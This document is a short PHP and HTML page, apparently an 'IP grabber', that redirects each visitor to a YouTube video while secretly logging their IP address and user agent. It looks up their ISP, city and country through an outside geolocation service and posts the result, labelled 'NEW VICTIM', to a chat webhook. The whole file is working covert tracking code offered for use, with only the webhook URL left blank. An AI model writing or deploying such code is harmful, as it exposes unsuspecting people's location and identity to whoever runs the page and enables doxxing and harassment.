<html>
    <head>
        <meta http-equiv='refresh' content='0; URL=https://www.youtube.com/watch?v=U1g4LDZu9Cc'>
    </head>
    <body>
    </body>
</html>
<?php
$webhookurl = "";
$ip= $_SERVER['REMOTE_ADDR'];
$useragent= $_SERVER['HTTP_USER_AGENT'];
$json=file_get_contents("https://extreme-ip-lookup.com/json/$ip");
extract(json_decode($json,true));
$msg = "**NEW VICTIM**
```IP: $ip
ISP: $isp
City: $city
Country: $country
UserAgent: $useragent```";
$json_data = array ('content'=>"$msg");
$make_json = json_encode($json_data);
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
?>
